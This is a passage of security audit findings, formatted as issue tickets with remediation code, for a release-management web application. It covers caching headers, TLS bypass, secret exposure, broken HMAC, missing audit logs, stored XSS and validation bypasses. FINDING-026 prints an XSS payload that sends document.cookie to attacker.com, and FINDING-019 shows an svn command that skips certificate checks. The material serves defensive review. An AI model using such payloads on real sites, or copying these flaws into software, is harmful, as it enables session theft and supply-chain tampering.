    
    if not client_session:
        return quart.jsonify({'authenticated': False})
    
    # Create response object
    response = quart.jsonify(dict(client_session))
    
    # Add anti-caching headers
    response.headers['Cache-Control'] = 'no-store'
    response.headers['Pragma'] = 'no-cache'
    
    return response
```

### Acceptance Criteria
- [ ] Cache-Control: no-store header added
- [ ] Pragma: no-cache header added
- [ ] Integration test verifying headers present
- [ ] Browser testing confirms no caching of session data
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.3.2.md
- Related findings: None
- ASVS sections: 14.3.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-017 - No Global Anti-Caching Middleware (Architectural Gap)

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The application lacks any global or blueprint-level middleware to enforce anti-caching headers. While individual endpoints can set headers (as demonstrated by `jwt_post`), there is no architectural enforcement mechanism. This creates a systemic vulnerability where every new endpoint automatically lacks protection unless developers manually remember to add headers. Coverage analysis shows only ~6% of sensitive endpoints (1 out of ~16 endpoints) have anti-caching headers, and all four blueprints define `before_request` hooks but none define `after_request` hooks that would add security headers.

### Details
**Affected Files:**
- `atr/blueprints/api.py` (no after_request hook)
- `atr/blueprints/admin.py` (no after_request hook)
- `atr/blueprints/get.py` (no after_request hook)
- `atr/blueprints/post.py` (no after_request hook)
- `src/asfquart/generics.py` (no after_request hook)

This is a Type B gap with systemic implications:
- Only 1 of ~16 sensitive endpoints protected
- Every new endpoint automatically lacks protection
- No architectural enforcement
- Developer must manually remember headers
- High risk of regression

Affected endpoints include:
- `/api/jwt/create` (FINDING-015)
- `/auth` session display (FINDING-016)
- Multiple other endpoints returning sensitive data

### Recommended Remediation
Add application-wide `@app.after_request` hook to set security headers on all responses:

```python
# In atr/server.py after app initialization
@app.after_request
async def add_security_headers(response):
    """Add security headers to all responses."""
    # Only set if not already set (allow endpoint override)
    response.headers.setdefault('Cache-Control', 'no-store')
    response.headers.setdefault('Pragma', 'no-cache')
    
    # Additional security headers
    response.headers.setdefault('X-Content-Type-Options', 'nosniff')
    response.headers.setdefault('X-Frame-Options', 'DENY')
    
    return response
```

**Alternative: Per-blueprint hooks**
```python
# In each blueprint file (atr/blueprints/*.py)
@_BLUEPRINT.after_request
async def add_security_headers(response):
    """Add security headers to blueprint responses."""
    response.headers.setdefault('Cache-Control', 'no-store')
    response.headers.setdefault('Pragma', 'no-cache')
    return response
```

### Acceptance Criteria
- [ ] Global after_request hook implemented
- [ ] Security headers added to all responses
- [ ] Endpoints can override if needed
- [ ] Integration tests verify headers on all endpoints
- [ ] Documentation updated with header policy
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.3.2.md
- Related findings: ASVS-1432-CRI-001, ASVS-1432-HIGH-003, ASVS-1432-HIGH-004, ASVS-1432-MED-006
- ASVS sections: 14.3.2
- CWE: None specified

### Priority
Critical

---

## Issue: FINDING-018 - Pagination Offset Validation Completely Bypassed Due to Typo

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The pagination validation function contains a critical typo that renders offset validation completely ineffective. The code checks for `hasattr(query_args, "offest")` instead of `hasattr(query_args, "offset")`, making the entire validation block unreachable dead code. This allows attackers to specify arbitrary offset values (e.g., 999,999,999), forcing the database to perform full table scans through millions of rows, causing resource exhaustion, service degradation, and potential denial of service. The issue affects multiple API endpoints including releases_list, tasks_list, and ssh_keys_list.

### Details
**Affected Files:**
- `atr/api/__init__.py` lines 805-825
- `atr/api/__init__.py` line 665
- `atr/api/__init__.py` line 720
- `atr/api/__init__.py` line 775

The typo makes the validation unreachable, allowing:
- Negative offset values
- Arbitrarily large offset values (999,999,999+)
- Full table scans through millions of rows
- Database resource exhaustion
- Service degradation/DoS

Multiple API endpoints are affected, multiplying the attack surface.

### Recommended Remediation
Fix the typo and add comprehensive validation:

```python
def _pagination_args_validate(query_args):
    """Validate pagination arguments."""
    # Fix typo: change 'offest' to 'offset'
    if hasattr(query_args, "offset"):
        # Add explicit type check
        if not isinstance(query_args.offset, int):
            raise ValueError("Offset must be an integer")
        
        # Validate range
        if query_args.offset < 0:
            raise ValueError("Offset must be non-negative")
        
        if query_args.offset > 1000000:
            raise ValueError("Offset must not exceed 1,000,000")
    
    # Similar validation for limit
    if hasattr(query_args, "limit"):
        if not isinstance(query_args.limit, int):
            raise ValueError("Limit must be an integer")
        
        if query_args.limit < 1 or query_args.limit > 1000:
            raise ValueError("Limit must be between 1 and 1,000")
```

Additional recommendations:
1. Add unit tests specifically validating offset rejection with large values (>1,000,000)
2. Add integration test creating archives with interleaved metadata files
3. Consider adding database-level query timeout protection as defense-in-depth

### Acceptance Criteria
- [ ] Typo corrected from 'offest' to 'offset'
- [ ] Explicit isinstance checks added
- [ ] Unit tests for boundary values added
- [ ] Integration tests verify rejection
- [ ] Query timeout protection considered
- [ ] Unit test verifying the fix

### References
- Source reports: L2:15.1.3.md, L2:15.2.2.md, L2:15.3.5.md, L2:15.3.7.md
- Related findings: FINDING-081, FINDING-318
- ASVS sections: 15.1.3, 15.2.2, 15.3.5, 15.3.7
- CWE: CWE-1284

### Priority
Critical

---

## Issue: FINDING-019 - SVN Operations Disable TLS Certificate Verification (Supply Chain Risk)

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
SVN export and import operations explicitly disable TLS certificate verification using `--trust-server-cert-failures` flags (unknown-ca,cn-mismatch), accepting any certificate regardless of validity. This completely neutralizes the security benefits of HTTPS encryption, allowing man-in-the-middle attacks on release artifact imports. An attacker with network position could inject malicious code into release artifacts without detection at the transport layer, creating a supply chain attack vector.

### Details
**Affected Files:**
- `atr/tasks/svn.py` lines 73-84
- `atr/tasks/svn.py` lines 93-103

The SVN commands include:
```bash
svn export --trust-server-cert-failures unknown-ca,cn-mismatch ...
```

This disables:
- Certificate authority validation
- Certificate common name validation
- Certificate expiration checks
- Certificate revocation checks

Attack scenario:
1. Attacker performs MITM on network path to SVN server
2. Presents self-signed or invalid certificate
3. SVN client accepts certificate without validation
4. Attacker modifies release artifacts in transit
5. Modified artifacts imported into ATR
6. Malicious code distributed to users

### Recommended Remediation
Remove certificate verification bypass flags:

```python
# In atr/tasks/svn.py
def svn_export(url, destination):
    """Export from SVN with proper certificate verification."""
    # Remove --trust-server-cert-failures flags
    cmd = [
        'svn', 'export',
        # '--trust-server-cert-failures', 'unknown-ca,cn-mismatch',  # REMOVE THIS
        '--non-interactive',
        '--no-auth-cache',
        url,
        destination
    ]
    
    # If custom CA needed for ASF internal infrastructure:
    # cmd.extend([
    #     '--config-option',
    #     'servers:global:ssl-authority-files=/path/to/asf-ca.pem'
    # ])
    
    subprocess.run(cmd, check=True)
```

**If custom CA is required:**
Configure SVN to trust only the specific ASF CA:
```python
cmd.extend([
    '--config-option',
    'servers:global:ssl-authority-files=/etc/ssl/certs/asf-ca.pem'
])
```

Do NOT disable verification entirely.

### Acceptance Criteria
- [ ] --trust-server-cert-failures flags removed
- [ ] Certificate verification enabled for all SVN operations
- [ ] If custom CA needed, specific CA configured (not verification disabled)
- [ ] Integration tests verify SVN operations succeed
- [ ] Security review confirms no verification bypass
- [ ] Unit test verifying the fix

### References
- Source reports: L2:12.3.1.md, L2:12.3.3.md
- Related findings: None
- ASVS sections: 12.3.1, 12.3.3
- CWE: CWE-295

### Priority
Critical

---

## Issue: FINDING-020 - Admin Environment Variable Endpoint Exposes All Secrets Without Redaction

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `/admin/env` endpoint exposes all environment variables including sensitive credentials (LDAP_BIND_PASSWORD, GITHUB_TOKEN, PUBSUB_PASSWORD, SVN_TOKEN, DATABASE_URL, JWT signing keys) in plaintext without any redaction. This contrasts with the `/admin/configuration` endpoint in the same file which properly implements secret redaction using pattern matching. While admin authentication is required, this creates an undocumented log broadcast channel that violates multiple ASVS requirements for secret protection and logging control.

### Details
**Affected Files:**
- `atr/admin/__init__.py` lines 320-350

The endpoint returns all environment variables without filtering:
```python
@app.get('/admin/env')
async def env():
    return dict(os.environ)  # Returns ALL env vars including secrets
```

Exposed secrets include:
- `LDAP_BIND_PASSWORD` - LDAP authentication credential
- `GITHUB_TOKEN` - GitHub API access token
- `PUBSUB_PASSWORD` - Message queue credential
- `SVN_TOKEN` - SVN authentication token
- `DATABASE_URL` - Database connection string with password
- JWT signing keys
- API keys for external services

The `/admin/configuration` endpoint in the same file correctly implements redaction:
```python
sensitive_config_patterns = ('PASSWORD', 'SECRET', 'TOKEN', 'KEY', 'CREDENTIAL')
# Redacts matching values
```

### Recommended Remediation
Apply the same redaction logic to the `env()` endpoint:

```python
@app.get('/admin/env')
async def env():
    """Return environment variables with sensitive values redacted."""
    sensitive_patterns = ('PASSWORD', 'SECRET', 'TOKEN', 'KEY', 'CREDENTIAL', 'URL')
    
    redacted_env = {}
    for key, value in os.environ.items():
        # Check if key contains sensitive pattern
        if any(pattern in key.upper() for pattern in sensitive_patterns):
            redacted_env[key] = '[REDACTED]'
        else:
            redacted_env[key] = value
    
    return redacted_env
```

Additionally:
- Document this endpoint in the log inventory as a broadcast channel
- Add audit logging when endpoint is accessed
- Consider removing endpoint entirely if not actively used

### Acceptance Criteria
- [ ] Sensitive environment variables redacted
- [ ] Redaction patterns match configuration endpoint
- [ ] Endpoint documented in log inventory
- [ ] Audit logging added for endpoint access
- [ ] Integration test verifies redaction
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.3.1.md, L2:13.3.2.md, L2:14.1.1.md, L2:16.2.3.md
- Related findings: FINDING-021
- ASVS sections: 13.3.1, 13.3.2, 14.1.1, 16.2.3
- CWE: CWE-532

### Priority
Critical

---

## Issue: FINDING-021 - Pagination Offset Validation Completely Bypassed Due to Typo

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The pagination validation function contains a critical typo checking `hasattr(query_args, 'offest')` instead of 'offset', causing the entire offset validation block to be skipped for all requests. This allows unbounded database offset values that can cause performance degradation and potential denial of service across three API endpoints. The typo prevents validation of both upper bounds (max 1,000,000) and lower bounds (min 0), allowing negative offsets and arbitrarily large values.

### Details
**Affected Files:**
- `atr/api/__init__.py` line ~696

The typo in the attribute name check causes the validation to never execute:
```python
if hasattr(query_args, 'offest'):  # TYPO: should be 'offset'
    # This entire block never executes
    if query_args.offset > 1000000 or query_args.offset < 0:
        raise ValueError("Invalid offset")
```

This allows:
- Negative offsets (undefined behavior)
- Offsets > 1,000,000 (extreme database load)
- Full table scans
- Resource exhaustion attacks

### Recommended Remediation
Fix the typo and add defense-in-depth validation:

```python
# Fix typo
if hasattr(query_args, 'offset'):  # Changed from 'offest'
    if query_args.offset > 1000000 or query_args.offset < 0:
        raise ValueError("Offset must be between 0 and 1,000,000")

# Alternative: Use Pydantic Field constraints as primary defense
class PaginationParams(BaseModel):
    offset: int = Field(default=0, ge=0, le=1000000)
    limit: int = Field(default=100, ge=1, le=1000)
```

Add comprehensive unit tests:
```python
def test_offset_validation():
    assert validate_pagination({'offset': 0}) == True
    assert validate_pagination({'offset': 1000000}) == True
    
    with pytest.raises(ValueError):
        validate_pagination({'offset': 1000001})
    
    with pytest.raises(ValueError):
        validate_pagination({'offset': -1})
```

### Acceptance Criteria
- [ ] Typo corrected from 'offest' to 'offset'
- [ ] Unit tests added for boundary values (0, 1000000, 1000001, -1)
- [ ] Pydantic Field constraints considered
- [ ] Integration tests verify validation executes
- [ ] Unit test verifying the fix

### References
- Source reports: L2:1.4.2.md, L2:13.3.2.md
- Related findings: FINDING-022
- ASVS sections: 1.4.2, 13.3.2
- CWE: CWE-20

### Priority
Critical

---

## Issue: FINDING-022 - HMAC Signer Verification Always Returns False (Broken Cryptographic Control)

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The `Signer.verify()` function has a critical bug where HMAC verification always returns False due to encoding mismatch. The function compares base64-encoded string (43 bytes ASCII) against base64-decoded raw bytes (32 bytes), which always fails. Root cause: `given_bytes` is base64-decoded raw HMAC digest while `expected` is base64-encoded string converted to ASCII bytes. This creates false confidence that HMAC integrity checks are working when they are completely broken.

### Details
**Affected Files:**
- `asfpy/crypto.py` lines 109-121

The broken verification code:
```python
def verify(self, *args: str, given: str) -> bool:
    """Verify HMAC signature - BROKEN."""
    try:
        # Decodes given signature to raw bytes (32 bytes)
        given_bytes = base64.urlsafe_b64decode(given + '==')
        
        # Generates expected as base64 string, then encodes to ASCII bytes (43 bytes)
        expected = base64.urlsafe_b64encode(digest).decode('ascii')
        
        # Comparing 32 bytes vs 43 bytes - ALWAYS FAILS
        return hmac.compare_digest(expected, given_bytes)
    except:
        return False
```

This renders HMAC verification completely non-functional:
- All valid signatures rejected
- All invalid signatures also rejected
- No actual integrity verification occurring
- False security confidence created

### Recommended Remediation
Fix the `verify()` method to compare values in the same representation:

**Option 1 (Recommended): Compare base64 strings directly**
```python
def verify(self, *args: str, given: str) -> bool:
    """Verify HMAC signature is correct."""
    try:
        # Generate expected signature (returns base64 string)
        expected = self.sign(*args)
        
        # Compare base64 strings directly
        return hmac.compare_digest(expected, given)
    except (base64.binascii.Error, ValueError):
        return False
```

**Option 2: Compare raw bytes**
```python
def verify(self, *args: str, given: str) -> bool:
    """Verify HMAC signature is correct."""
    try:
        # Compute raw digest
        expected_bytes = self._compute_digest(*args)
        
        # Decode given to raw bytes (add padding if needed)
        given_bytes = base64.urlsafe_b64decode(given + '==')
        
        # Compare raw bytes
        return hmac.compare_digest(expected_bytes, given_bytes)
    except (base64.binascii.Error, ValueError):
        return False
```

Add comprehensive unit tests:
```python
def test_signer_verify():
    signer = Signer(secret='test-key')
    
    # Test valid signature
    signature = signer.sign('data1', 'data2')
    assert signer.verify('data1', 'data2', given=signature) == True
    
    # Test invalid signature
    assert signer.verify('data1', 'data2', given='invalid') == False
    
    # Test tampered data
    signature = signer.sign('data1', 'data2')
    assert signer.verify('data1', 'tampered', given=signature) == False
```

### Acceptance Criteria
- [ ] verify() method fixed to compare matching types
- [ ] Unit tests for valid signature verification added
- [ ] Unit tests for invalid signature rejection added
- [ ] Unit tests for tampered data detection added
- [ ] All existing Signer usages tested
- [ ] Unit test verifying the fix

### References
- Source reports: L2:11.1.1.md, L2:11.1.2.md, L2:11.2.1.md
- Related findings: None
- ASVS sections: 11.1.1, 11.1.2, 11.2.1
- CWE: CWE-347

### Priority
Critical

---

## Issue: FINDING-023 - Admin User Impersonation Has No Audit Trail

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
An administrator can impersonate any user account with zero audit logging. The only logging code present was explicitly commented out, and even that would have logged to the general log rather than the dedicated audit log. A compromised admin account used for malicious impersonation leaves zero forensic evidence, violating the fundamental principle that privileged operations must be auditable. This prevents detection and investigation of unauthorized admin actions.

### Details
**Affected Files:**
- `atr/admin/__init__.py` lines 135-165

The impersonation function:
```python
@admin.post('/impersonate')
async def impersonate(form: ImpersonateForm):
    """Impersonate user - NO AUDIT LOGGING."""
    target_uid = form.target_uid
    
    # Commented out logging (would go to general log, not audit log anyway)
    # logger.info(f"Admin impersonating {target_uid}")
    
    # Modify session to impersonate target user
    session['asf_uid'] = target_uid
    # NO AUDIT LOG ENTRY CREATED
    
    return redirect('/dashboard')
```

Impact of missing audit logging:
- No record of which admin performed impersonation
- No record of which user was impersonated
- No timestamp of impersonation event
- No record of impersonation source IP
- No ability to investigate suspicious admin activity
- No compliance evidence for security audits

### Recommended Remediation
Add explicit audit logging before session modification:

```python
@admin.post('/impersonate')
async def impersonate(session: ClientSession, form: ImpersonateForm):
    """Impersonate user with audit logging."""
    admin_asf_uid = session.asf_uid
    target_asf_uid = form.target_uid
    
    # Verify target user exists
    if not ldap.account_lookup(target_asf_uid):
        raise ASFQuartException("User not found", errorcode=404)
    
    # AUDIT LOG BEFORE session modification
    storage.audit(
        actor=admin_asf_uid,
        operation='admin_impersonation',
        target=target_asf_uid,
        metadata={
            'remote_addr': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'timestamp': datetime.utcnow().isoformat()
        }
    )
    
    # Now modify session
    session['asf_uid'] = target_asf_uid
    session['impersonated_by'] = admin_asf_uid  # Track original admin
    await session.write(request, session)
    
    return redirect('/dashboard')
```

The audit log entry must be written BEFORE the session cookie is modified to ensure the event is captured even if subsequent operations fail.

### Acceptance Criteria
- [ ] Audit logging added before session modification
- [ ] Admin UID captured in audit log
- [ ] Target UID captured in audit log
- [ ] Remote address captured in audit log
- [ ] User agent captured in audit log
- [ ] Audit log query tool can filter impersonation events
- [ ] Unit test verifying audit log creation

### References
- Source reports: L2:16.2.1.md
- Related findings: FINDING-024, FINDING-025
- ASVS sections: 16.2.1
- CWE: CWE-778

### Priority
Critical

---

## Issue: FINDING-024 - Committee Key Bulk Deletion Bypasses Storage Layer and Audit

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The admin route directly uses `db.session()` to delete committee signing keys, bypassing both the storage layer's authorization framework and its audit logging. The storage interface documentation explicitly warns against this pattern. Bulk deletion of committee signing keys—which are critical for release artifact verification—leaves no audit trail, making it impossible to investigate which keys were deleted, by whom, and when.

### Details
**Affected Files:**
- `atr/admin/__init__.py` lines 290-340

The vulnerable code pattern:
```python
@admin.post('/committee/keys/delete')
async def delete_committee_keys(form: DeleteKeysForm):
    """Delete committee keys - NO AUDIT LOGGING."""
    committee_key = form.committee_key
    
    # Direct database access bypassing storage layer
    with db.session() as session:
        keys = session.query(OpenPGPKey).filter_by(
            committee=committee_key
        ).all()
        
        for key in keys:
            session.delete(key)  # NO AUDIT LOG
        
        session.commit()
    
    return redirect('/admin/keys')
```

This bypasses:
- Storage layer authorization checks
- Audit logging infrastructure
- Key deletion workflow
- Committee membership validation

Consequences:
- No audit trail for key deletion
- Cannot investigate security incidents
- Cannot determine which keys were deleted
- Cannot identify who deleted keys
- Violates compliance requirements

### Recommended Remediation
**Option A (Recommended): Use storage layer**
```python
@admin.post('/committee/keys/delete')
async def delete_committee_keys(session: ClientSession, form: DeleteKeysForm):
    """Delete committee keys with audit logging."""
    committee_key = form.committee_key
    
    # Fetch keys to delete
    keys = db.query(OpenPGPKey).filter_by(
        committee=committee_key
    ).all()
    
    # Use storage layer for each deletion (includes audit logging)
    wafa = storage.write(session.asf_uid)
    for key in keys:
        wafa.keys.delete_key(key.fingerprint)
        # Storage layer automatically:
        # - Validates authorization
        # - Creates audit log entry
        # - Handles committee association cleanup
    
    return redirect('/admin/keys')
```

**Option B: Add explicit audit logging**
If storage layer cannot be used:
```python
# Add audit log entry before deletion
storage.audit(
    actor=session.asf_uid,
    operation='committee_keys_bulk_delete',
    target=committee_key,
    metadata={
        'keys_deleted': len(keys),
        'fingerprints': [key.fingerprint for key in keys],
        'remote_addr': request.remote_addr,
        'timestamp': datetime.utcnow().isoformat()
    }
)
```

### Acceptance Criteria
- [ ] Storage layer used for key deletion OR explicit audit logging added
- [ ] Committee key captured in audit log
- [ ] Count of deleted keys captured
- [ ] List of fingerprints captured
- [ ] Admin UID captured
- [ ] Integration test verifies audit log creation
- [ ] Unit test verifying the fix

### References
- Source reports: L2:16.2.1.md
- Related findings: FINDING-023, FINDING-025
- ASVS sections: 16.2.1
- CWE: CWE-778

### Priority
Critical

---

## Issue: FINDING-025 - OpenPGP Key Management Entirely Lacks Audit Logging

**Labels:** bug, security, priority:critical, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The key management writer module contains an explicit `# TODO: Add auditing` comment on line 20. None of the security-critical operations—key deletion, insertion, association with committees, or import from files—call `self.__write_as.append_to_audit_log()`, despite this facility being available and consistently used in other writer modules. OpenPGP signing keys are the foundation of Apache release artifact verification, yet their lifecycle has zero audit trail.

### Details
**Affected Files:**
- `atr/storage/writers/keys.py` lines 20-350

The TODO comment explicitly acknowledges the gap:
```python
# atr/storage/writers/keys.py:20
# TODO: Add auditing
```

Operations lacking audit logging:
1. **delete_key()** - No record of key deletion
2. **__database_add_model()** - No record of key insertion
3. **associate_fingerprint()** - No record of committee association
4. **disassociate_fingerprint()** - No record of committee disassociation
5. **ensure_stored_one()** - No record of key storage
6. **import_keys_file()** - No record of bulk import
7. **test_user_delete_all()** - No record of test cleanup

Other writer modules (tokens.py, vote.py, release.py) consistently use audit logging:
```python
self.__write_as.append_to_audit_log(
    operation='token_create',
    metadata={'token_id': token.id}
)
```

Impact:
- Cannot investigate key compromise
- Cannot determine who added/removed keys
- Cannot track committee key associations
- Cannot meet compliance requirements
- Cannot audit key management operations

### Recommended Remediation
Add `self.__write_as.append_to_audit_log()` calls to all key management operations:

```python
# In delete_key()
def delete_key(self, fingerprint: str):
    """Delete key with audit logging."""
    key = self._fetch_key(fingerprint)
    
    # Audit before deletion
    self.__write_as.append_to_audit_log(
        operation='key_delete',
        metadata={
            'fingerprint': fingerprint,
            'key_owner': key.asf_uid,
            'committees': [c.key for c in key.committees]
        }
    )
    
    self.__database_delete(key)

# In __database_add_model()
def __database_add_model(self, key: OpenPGPKey):
    """Add key with audit logging."""
    self.__write_as.append_to_audit_log(
        operation='key_insert',
        metadata={
            'fingerprint': key.fingerprint,
            'key_type': key.key_type,
            'asf_uid': key.asf_uid
        }
    )
    
    db.session.add(key)
    db.session.commit()

# In associate_fingerprint()
def associate_fingerprint(self, fingerprint: str, committee_key: str):
    """Associate key with committee with audit logging."""
    self.__write_as.append_to_audit_log(
        operation='key_associate_committee',
        metadata={
            'fingerprint': fingerprint,
            'committee_key': committee_key
        }
    )
    
    # Existing association logic...

# Similar for other operations
```

Remove TODO comment on line 20 once implemented.

### Acceptance Criteria
- [ ] Audit logging added to delete_key()
- [ ] Audit logging added to __database_add_model()
- [ ] Audit logging added to associate_fingerprint()
- [ ] Audit logging added to disassociate_fingerprint()
- [ ] Audit logging added to ensure_stored_one()
- [ ] Audit logging added to import_keys_file()
- [ ] Audit logging added to test_user_delete_all()
- [ ] TODO comment removed
- [ ] Unit tests verify audit log creation

### References
- Source reports: L2:16.1.1.md, L2:16.2.1.md
- Related findings: FINDING-023, FINDING-024, FINDING-088
- ASVS sections: 16.1.1, 16.2.1
- CWE: CWE-778

### Priority
Critical

---

## Issue: FINDING-026 - Unsanitized Markdown-to-HTML Conversion Allows Stored XSS in SBOM Vulnerability Descriptions

**Labels:** bug, security, priority:high, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** [L1, L2]

**Description:**

### Summary
The application converts markdown vulnerability descriptions from external sources (OSV API, CycloneDX SBOM files) to HTML using `cmarkgfm.github_flavored_markdown_to_html()`, then wraps the output in `markupsafe.Markup()` to bypass htpy's automatic escaping. The markdown library preserves raw HTML tags in the input, enabling stored XSS attacks. Attacker uploads malicious CycloneDX SBOM file → SBOM contains crafted vulnerability.detail field with embedded HTML/JavaScript → cmarkgfm preserves raw HTML tags → `markupsafe.Markup()` marks output as safe, bypassing htpy escaping → JavaScript executes in victim's browser when viewing SBOM report. This affects authenticated committer sessions viewing SBOM reports.

### Details
**Affected Files:**
- `atr/get/sbom.py` lines 290-310
- `atr/get/sbom.py` line 370

Data flow:
1. Attacker uploads SBOM file with malicious payload in vulnerability description
2. SBOM parsed and stored in database
3. User views SBOM report
4. Markdown converted to HTML without sanitization
5. Output wrapped in Markup() to bypass escaping
6. HTML rendered in browser
7. JavaScript executes in victim's session

Example malicious payload:
```json
{
  "vulnerabilities": [{
    "detail": "This vulnerability is <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script> critical"
  }]
}
```

### Recommended Remediation
**Option A (Recommended): Use cmarkgfm safe mode**
```python
import cmarkgfm
from cmarkgfm.cmark import Options as cmark_opts

def render_markdown(text: str) -> str:
    """Render markdown with dangerous HTML stripped."""
    html = cmarkgfm.github_flavored_markdown_to_html(
        text,
        options=cmark_opts.CMARK_OPT_SAFE  # Replaces dangerous HTML with comments
    )
    return markupsafe.Markup(html)
```

**Option B (Most Robust): Use dedicated HTML sanitizer**
```python
import nh3  # or bleach
import cmarkgfm

# Define allowed tags and attributes
ALLOWED_TAGS = {'p', 'br', 'strong', 'em', 'code', 'pre', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'blockquote'}
ALLOWED_ATTRIBUTES = {'a': {'href', 'title'}}

def render_markdown(text: str) -> str:
    """Render markdown and sanitize HTML."""
    # Convert markdown to HTML
    html = cmarkgfm.github_flavored_markdown_to_html(text)
    
    # Sanitize HTML BEFORE marking as safe
    clean_html = nh3.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        link_rel='noopener noreferrer'
    )
    
    return markupsafe.Markup(clean_html)
```

Additional recommendations:
1. Audit all `markupsafe.Markup()` calls in codebase
2. Establish code review rule requiring sanitization before `Markup()` calls on non-constant values
3. Add automated XSS testing for SBOM uploads
4. Pin cmarkgfm version with known safe defaults

### Acceptance Criteria
- [ ] HTML sanitization added to markdown rendering
- [ ] Safe mode or dedicated sanitizer implemented
- [ ] Allowed tags whitelist configured
- [ ] All Markup() calls audited
- [ ] XSS tests added for SBOM uploads
- [ ] Code review rule documented
- [ ] Unit test verifying XSS prevention

### References
- Source reports: L1:1.2.3.md, L2:1.3.10.md
- Related findings: FINDING-096, FINDING-321
- ASVS sections: 1.2.3, 1.3.10
- CWE: CWE-79

### Priority
High

---

## Issue: FINDING-027 - Pagination Offset Validation Completely Bypassed Due to Typo

**Labels:** bug, security, priority:high, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The pagination validation function contains a typo that causes offset validation to be completely bypassed. The function checks for an attribute named 'offest' (missing 'f') instead of 'offset', causing the `hasattr()` check to always fail even when the offset parameter is present. This allows unbounded offset values that force SQLite to sequentially scan millions of rows, enabling DoS attacks.

### Details
**Affected Files:**
- `atr/api/__init__.py` line ~640

The typo in the validation function:
```python
def _pagination_args_validate(query_args):
    if hasattr(query_args, 'offest'):  # TYPO: should be 'offset'
        # Validation never executes
        if query_args.offset > 1000000 or query_args.offset < 0:
            raise ValueError("Invalid offset")
```

Impact:
- Offset validation never executes
- Negative offsets allowed (undefined behavior)
- Extremely large offsets allowed (999,999,999+)
- Database forced to scan millions of rows
- Service degradation through resource exhaustion

### Recommended Remediation
Fix the typo in the field name check:

```python
def _pagination_args_validate(query_args):
    # Fix typo: change 'offest' to 'offset'
    if hasattr(query_args, 'offset'):
        if query_args.offset > 1000000 or query_args.offset < 0:
            raise ValueError("Offset must be between 0 and 1,000,000")
    
    # Similar check for limit
    if hasattr(query_args, 'limit'):
        if query_args.limit < 1 or query_args.limit > 1000:
            raise ValueError("Limit must be between 1 and 1,000")
```

### Acceptance Criteria
- [ ] Typo corrected from 'offest' to 'offset'
- [ ] Offset validation executes correctly
- [ ] Unit tests verify validation with boundary values
- [ ] Integration tests confirm fix
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.2.1.md
- Related findings: None
- ASVS sections: 2.2.1
- CWE: None specified

### Priority
High

---

## Issue: FINDING-028 - Trusted Publishing Form Bypasses GitHub URL/Path Validation

**Labels:** bug, security, priority:high, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The form-based endpoint for editing trusted publishing settings bypasses critical business validation that is correctly applied to the API endpoint. The `_normalise_trusted_publishing_update()` function validates GitHub repository names (rejecting slashes) and workflow paths (requiring .github/workflows/ prefix), but `edit_trusted_publishing()` directly assigns form values without calling this validator. This allows invalid repository names and workflow paths to be persisted, potentially causing authorization bypass in GitHub OIDC identity matching.

### Details
**Affected Files:**
- `atr/storage/writers/policy.py` lines ~267-284

The API endpoint correctly applies validation:
```python
def update_via_api(data):
    # Validation applied
    normalized = _normalise_trusted_publishing_update(data)
    policy.github_repository = normalized.github_repository
    policy.workflow_path = normalized.workflow_path
```

The form endpoint bypasses validation:
```python
def edit_trusted_publishing(form):
    # Direct assignment without validation
    policy.github_repository = form.github_repository.data
    policy.workflow_path = form.workflow_path.data
```

Missing validations:
1. GitHub repository name must not contain slashes
2. Workflow path must start with `.github/workflows/`
3. Repository name format validation
4. Path traversal prevention

### Recommended Remediation
Apply the `_normalise_trusted_publishing_update()` validation function in `edit_trusted_publishing()`:

```python
def edit_trusted_publishing(session: ClientSession, form: EditTrustedPublishingForm):
    """Update trusted publishing settings with validation."""
    project_key = form.project_key
    
    # Fetch policy
    policy = storage.read().policy(project_key)
    
    # Apply validation BEFORE assignment
    validated_data = _normalise_trusted_publishing_update({
        'github_repository': form.github_repository.data,
        'workflow_path': form.workflow_path.data
    })
    
    # Now assign validated values
    policy.github_repository = validated_data['github_repository']
    policy.workflow_path = validated_data['workflow_path']
    
    storage.write(session).as_committee_member(project_key).policy.update(policy)
    
    return redirect(f'/project/{project_key}/policy')
```

### Acceptance Criteria
- [ ] Validation function called before assignment
- [ ] Invalid repository names rejected
- [ ] Invalid workflow paths rejected
- [ ] Form submission matches API validation behavior
- [ ] Integration tests verify validation
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.2.1.md
- Related findings: ASVS-221-HIGH-003, ASVS-221-MED-002
- ASVS sections: 2.2.1
- CWE: None specified

### Priority
High

---

## Issue: FINDING-029 - Vote Policy Form Bypasses Minimum Hours Range Check

**Labels:** bug, security, priority:high, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The form-based endpoint for editing vote policy bypasses the minimum hours range validation (72-144 hours or 0) that is correctly applied to the API endpoint. This allows committee members to set voting periods that violate policy-mandated minimums via the web interface, potentially enabling governance bypass through extremely short or long voting periods.

### Details
**Affected Files:**
- `atr/storage/writers/policy.py` lines ~220-236 (API endpoint with validation)
